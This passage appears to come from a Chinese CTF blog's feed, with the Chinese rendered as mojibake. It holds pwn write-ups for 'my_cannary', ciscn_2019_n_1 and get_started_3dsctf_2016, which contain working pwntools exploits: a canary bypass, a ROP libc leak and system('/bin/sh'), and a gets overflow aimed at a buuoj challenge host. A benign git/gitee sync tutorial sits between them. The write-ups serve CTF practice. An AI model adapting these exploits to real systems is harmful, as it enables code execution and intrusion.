class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br>                           <br></code></pre></td></tr></table></figure><blockquote><p>ldd my_cannary è¯»å–libc</p><p>è·å¾—pop_rdi_ret åœ°å€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">ROPgadget --binary pwn-100 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdi&quot;</span></span><br></code></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œä½¿ç”¨gotè¡¨çš„exitæ¥æ”¾åœ¨cannaryä¸Šï¼Œpauseä¹‹åæ‰“å¼€edbè°ƒè¯•</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223010439895.png" class="" title="image-20191223010439895"><p>è¿è¡Œåˆ°è¿™å¯ä»¥çœ‹è§rdxå€¼ä¸º 0x601058 [rdx] = 0x4006f6</p><p>payload += p64(0x4006f6)</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223010623917.png" class="" title="image-20191223010623917"><p>è¿™æ · rdx å’Œ [rbp-8] çš„å€¼å°±ä¸€æ ·äº†ï¼Œå¼‚æˆ–å°±ä¸º0</p><p>éšå</p><p>payload += p64(pop_rdi_ret)<br>payload += p64(start_main)</p><p>æµ‹è¯•æ˜¯å¦èƒ½return to main</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011050308.png" class="" title="image-20191223011050308"><p>å¯ä»¥ä¹‹åï¼Œæˆ‘ä»¬å†åœ¨pop_rdi_retä¹‹åè°ƒç”¨puts æ‰“å°libcåœ°å€ å†return to mainå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(__libc_start_main)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(start_main)<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br><br></code></pre></td></tr></table></figure><p>ç›´æ¥è¿è¡Œï¼ŒæŠ¥é”™ï¼Œä¹Ÿæ²¡æœ‰æ‰“å°lbcï¼Œæ‰“å¼€edbçœ‹</p><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011616461.png" class="" title="image-20191223011616461"><p>è¿™æ˜¯å•¥åœ°å€ï¼Œæ·»åŠ logè¾“å‡ºä¹‹å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">log.success(<span class="hljs-string">&quot;pop_rdi_ret====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(pop_rdi_ret))<br>log.success(<span class="hljs-string">&quot;put_plt====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.success(<span class="hljs-string">&quot;__libc_start_main====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>log.success(<span class="hljs-string">&quot;start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(start_main))<br></code></pre></td></tr></table></figure><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011833341.png" class="" title="image-20191223011833341">å‘ç°å’‹è·³è½¬åˆ°äº†libc_start_mainåœ°å€ä¸Šï¼Œæœ¬åº”è·³è½¬åˆ°pop_rdi_retçš„ã€‚åç§»å¯èƒ½æœ‰é—®é¢˜<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += cyclic(<span class="hljs-number">20</span>) <span class="hljs-comment">#è®¡ç®—20ä¸ªæ¥çœ‹åç§»</span><br>payload += p64(pop_rdi_ret)<br>payload += p64(__libc_start_main)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(start_main)<br>log.success(<span class="hljs-string">&quot;pop_rdi_ret====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(pop_rdi_ret))<br>log.success(<span class="hljs-string">&quot;put_plt====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.success(<span class="hljs-string">&quot;__libc_start_main====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>log.success(<span class="hljs-string">&quot;start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(start_main))<br>pause()<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012131411.png" class="" title="image-20191223012131411"><p>è¿™æ ·å°±çœ‹è§äº†ï¼Œç„¶å<code>cyclic -l 0x61616163</code>è®¡ç®—å¾—8 </p><p>é‚å°†cyclic20çš„ä¿®æ”¹ä¸º8 payload += cyclic(8)</p> <img src="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012338855.png" class="" title="image-20191223012338855"><p>è¿™æ ·å°±æ‰“å°å‡ºä¸€å †ä¹±ç äº†ï¼Œç„¶åå†™ä»£ç æ¥æ”¶libc_start_mainï¼Œè®¡ç®—systemå’Œbinsh</p><p>Exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./my_cannary&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;my_cannary&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x0400a43</span><br>start_main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>__libc_start_main = elf.got[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += cyclic(<span class="hljs-number">8</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(__libc_start_main)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(start_main)<br>log.success(<span class="hljs-string">&quot;pop_rdi_ret====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(pop_rdi_ret))<br>log.success(<span class="hljs-string">&quot;put_plt====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.success(<span class="hljs-string">&quot;__libc_start_main====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>log.success(<span class="hljs-string">&quot;start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(start_main))<br>pause()<br>sh.sendline(payload)<br>__libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;__libc_start_main=====&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(__libc_start_main))<br>libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>payload = cyclic(<span class="hljs-number">0x30</span>)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x4006f6</span>)<br>payload += cyclic(<span class="hljs-number">8</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(binsh)<br>payload += p64(system)<br>sh.recvuntil(<span class="hljs-string">&quot;begin&quot;</span>)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>ubuntu18å¦‚æœè¿è¡Œæ— æ³•æ‹¿shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(binsh)<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(system + <span class="hljs-number">0</span>x<span class="hljs-number">1</span>b)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>æ¯”èµ›</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gitåŒæ­¥åˆ°githubå’Œgitee</title>
    <link href="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/"/>
    <url>/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/</url>
    
    <content type="html"><![CDATA[<p>==æŒ‰ç…§æ­¤è¯´æ˜åšä¸‹æ¥ä¿è¯å¯ç”¨ï¼Œä½†æˆ‘ä¹Ÿè¿˜æ²¡å®Œå…¨ç ”ç©¶é€å½»æ‰€ä»¥æœ‰è¯¸å¤šä¸è¶³è¯·å¤šåŸè°…==</p><h1 id="ä¸€ã€å‡†å¤‡å·¥ä½œ"><a href="#ä¸€ã€å‡†å¤‡å·¥ä½œ" class="headerlink" title="ä¸€ã€å‡†å¤‡å·¥ä½œ"></a>ä¸€ã€å‡†å¤‡å·¥ä½œ</h1><h2 id="1ã€å»ºç«‹ä¸€ä¸ªä»“åº“"><a href="#1ã€å»ºç«‹ä¸€ä¸ªä»“åº“" class="headerlink" title="1ã€å»ºç«‹ä¸€ä¸ªä»“åº“"></a>1ã€å»ºç«‹ä¸€ä¸ªä»“åº“</h2><p><a href="https://gitee.com/">https://gitee.com/</a></p><img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802193737452.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><h2 id="2ã€ä¸‹è½½git"><a href="#2ã€ä¸‹è½½git" class="headerlink" title="2ã€ä¸‹è½½git"></a>2ã€ä¸‹è½½git</h2><p><a href="https://git-scm.com/">https://git-scm.com/</a><br>å¯ä»¥è·Ÿéšè¿™ä¸ª <a href="https://blog.csdn.net/sishen47k/article/details/80211002">https://blog.csdn.net/sishen47k/article/details/80211002</a> å®‰è£…</p><h1 id="äºŒã€å¼€å§‹æ“ä½œ"><a href="#äºŒã€å¼€å§‹æ“ä½œ" class="headerlink" title="äºŒã€å¼€å§‹æ“ä½œ"></a>äºŒã€å¼€å§‹æ“ä½œ</h1><h2 id="1ã€åˆ›å»ºSSHkey"><a href="#1ã€åˆ›å»ºSSHkey" class="headerlink" title="1ã€åˆ›å»ºSSHkey"></a>1ã€åˆ›å»ºSSHkey</h2><p>æ‰“å¼€Git Bashï¼Œè¾“å…¥<code>ssh-keygen -t rsa</code><br>ä¼šåˆ†åˆ«æç¤ºä½ æ–‡ä»¶åï¼Œå¯†ç ï¼ˆå¯ä¸è®¾ç½®ï¼‰ï¼Œç¡®è®¤å¯†ç ã€‚ä¸€èˆ¬ä¸‰æ¬¡å›è½¦å°±å¯ä»¥<br>åœ¨ C:\Users\â€œä½ çš„ç”¨æˆ·åâ€.ssh ç›®å½•ä¸‹å°±ä¼šæœ‰.pubç»“å°¾çš„æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¤åˆ¶é‡Œé¢çš„ä¸œè¥¿ï¼Œè¿™å°±æ˜¯ä½ çš„SSH key</p><h2 id="2ã€æ·»åŠ keyåˆ°Gitee"><a href="#2ã€æ·»åŠ keyåˆ°Gitee" class="headerlink" title="2ã€æ·»åŠ keyåˆ°Gitee"></a>2ã€æ·»åŠ keyåˆ°Gitee</h2><p>gitee-&gt;è®¾ç½®-&gt;SSHå…¬é’¥<br>æŠŠkeyç²˜è´´è¿›å»ï¼Œæ ‡é¢˜é»˜è®¤æ˜¯æœ¬æœºçš„åå­—</p><h2 id="3ã€gitè¿æ¥åˆ°gitee"><a href="#3ã€gitè¿æ¥åˆ°gitee" class="headerlink" title="3ã€gitè¿æ¥åˆ°gitee"></a>3ã€gitè¿æ¥åˆ°gitee</h2><h3 id="httpsè¿æ¥"><a href="#httpsè¿æ¥" class="headerlink" title="httpsè¿æ¥"></a>httpsè¿æ¥</h3><p>æ‹·è´ä¸‹æ¥ä½ ä»“åº“çš„é“¾æ¥ï¼Œå¦‚ <a href="https://gitee.com/xxxxx">https://gitee.com/xxxxx</a><br>ç„¶ååœ¨ä½ æƒ³åŒæ­¥çš„æ–‡ä»¶å¤¹ä¸Šå³é”®<img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802195801320.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»GIt Bash Hereï¼Œè¾“å…¥</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">git <span class="hljs-keyword">init</span><br>git remote <span class="hljs-keyword">add</span> origin https:<span class="hljs-comment">//gitee.com/xxxxx</span><br></code></pre></td></tr></table></figure><p>add originçš„originæ˜¯ç»™ä»–çš„ä¸€ä¸ªå‘½å<br>ç„¶åè®¾ç½®configï¼Œåˆ†åˆ«è®¾ç½®åå­—å’Œé‚®ç®±</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.name</span> <span class="hljs-string">&quot;Your Name&quot;</span><br>git <span class="hljs-keyword">config</span> --<span class="hljs-keyword">global</span> user<span class="hljs-variable">.email</span> <span class="hljs-string">&quot;you@example.com&quot;</span><br></code></pre></td></tr></table></figure><h3 id="sshé“¾æ¥-æ¨è"><a href="#sshé“¾æ¥-æ¨è" class="headerlink" title="sshé“¾æ¥ ==æ¨è=="></a>sshé“¾æ¥ ==æ¨è==</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">$ssh -T git@gitee.com<br>Hi XXX! You<span class="hljs-symbol">&#x27;ve</span> successfully authenticated, but GITEE.COM does <span class="hljs-keyword">not</span> provide shell <span class="hljs-keyword">access</span>.<br></code></pre></td></tr></table></figure><p>åˆ™ä»£è¡¨sshé“¾æ¥æˆåŠŸ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git remote <span class="hljs-keyword">add</span> gitee git<span class="hljs-title">@gitee.com</span>:YourUserName/YourProjectName.git<br></code></pre></td></tr></table></figure><p>YourUserNameå’ŒYourProjectNameéƒ½æ˜¯è¦å…·ä½“çœ‹ä½ è‡ªå·±çš„å®é™…ç”¨æˆ·åå’Œä»“åº“åå­—<br>å³å¯ï¼Œå¯ä»¥é€šè¿‡<code>git remote -v</code>æŸ¥çœ‹</p><p>æ·»åŠ ä½ çš„æ–‡ä»¶<code>git add .</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> commit -m <span class="hljs-string">&quot;å¤‡æ³¨&quot;</span><br></code></pre></td></tr></table></figure><p>æ¨é€ <code>git push origin/gitee master</code><br>æ‹‰å– <code>git pull origin/gitee master</code> ==ä½¿ç”¨originæˆ–è€…giteeå–å†³äºä½ ç»™ä»–çš„å‘½å==</p><p>==è¿™é‡Œçš„masteråº”è¯¥ä¹Ÿå¯ä»¥æ¢æˆdevelopåˆ†æ”¯ä¸Šä¼ ==</p><p>æ·±å…¥ç†è§£githubæ¨¡å¼è¯·æˆ³ <a href="https://blog.csdn.net/weixin_33547926/article/details/78545042">https://blog.csdn.net/weixin_33547926/article/details/78545042</a></p><h1 id="3ã€å†æ¬¡æ›´æ–°ä¹‹åå¦‚ä½•åŒæ­¥"><a href="#3ã€å†æ¬¡æ›´æ–°ä¹‹åå¦‚ä½•åŒæ­¥" class="headerlink" title="3ã€å†æ¬¡æ›´æ–°ä¹‹åå¦‚ä½•åŒæ­¥"></a>3ã€å†æ¬¡æ›´æ–°ä¹‹åå¦‚ä½•åŒæ­¥</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git status<br>git add -A<br>git commit -a -m <span class="hljs-string">&quot;å¤‡æ³¨&quot;</span><br>git push origin/gitee <span class="hljs-keyword">master</span> <span class="hljs-title">-f</span><br></code></pre></td></tr></table></figure><h1 id="4ã€å–æ¶ˆæš‚å­˜"><a href="#4ã€å–æ¶ˆæš‚å­˜" class="headerlink" title="4ã€å–æ¶ˆæš‚å­˜"></a>4ã€å–æ¶ˆæš‚å­˜</h1><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">git <span class="hljs-built_in">status</span><br>git <span class="hljs-built_in">reset</span> filename<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨VScodeæ›´æ–°"><a href="#ä½¿ç”¨VScodeæ›´æ–°" class="headerlink" title="ä½¿ç”¨VScodeæ›´æ–°"></a>ä½¿ç”¨VScodeæ›´æ–°</h1><p>==å…ˆä¿å­˜æ–‡ä»¶ï¼Œå†æš‚å­˜æ›´æ”¹ï¼Œéšåæ‹‰å–ï¼ˆpullï¼‰ï¼Œå³å¯æäº¤ã€‚æäº¤å®Œåå†æ¨é€åˆ°ï¼ˆpushï¼‰==</p><img src="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190803083016935.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">]]></content>
    
    
    <categories>
      
      <category>æ•™ç¨‹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_n_1 WP</title>
    <link href="/2020/01/13/ciscn_2019_n_1%20WP/"/>
    <url>/2020/01/13/ciscn_2019_n_1%20WP/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-30h]</span><br>  <span class="hljs-keyword">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(&amp;v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹è§==æˆ‘è¿˜å°è¯•äº†ä¸€ä¸‹â€™aâ€™ * offset + â€˜11.28215â€™â€¦â€¦</p><p>ç„¶åå—æ¢¦ä¸€å¥ï¼šè¿™ä¸æ˜¯æœ‰getsï¼Œä½ ç›´æ¥è·³systemä¸å°±å¥½äº†ã€‚ã€‚ã€‚ã€‚</p><p>å“</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment">#sh = process(&quot;./ciscn_2019_n_1&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25925</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_1&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;er.&quot;</span>)<br>binsh = <span class="hljs-number">0x04006BE</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">56</span> <br>payload += p64(binsh)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="/2020/01/13/get_started_3dsctf_2016/"/>
    <url>/2020/01/13/get_started_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<p>mprotectå‡½æ•°åŸå‹ï¼š int mprotect(void *addr, size_t len, int prot);</p><p>addr å†…å­˜å¯å§‹åœ°å€</p><p>len ä¿®æ”¹å†…å­˜çš„é•¿åº¦</p><p>prot å†…å­˜çš„æƒé™</p><p>[<img src="/2020/01/13/get_started_3dsctf_2016/A7DNJ_MC7NXWW8JVZG.png" class="" title="img"></p><p>æ‰€ä»¥å¾—åˆ°exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>sh = elf.process()<br><span class="hljs-comment">#sh = remote(&#x27;node3.buuoj.cn&#x27;,27037)</span><br><br>pop3_ret = <span 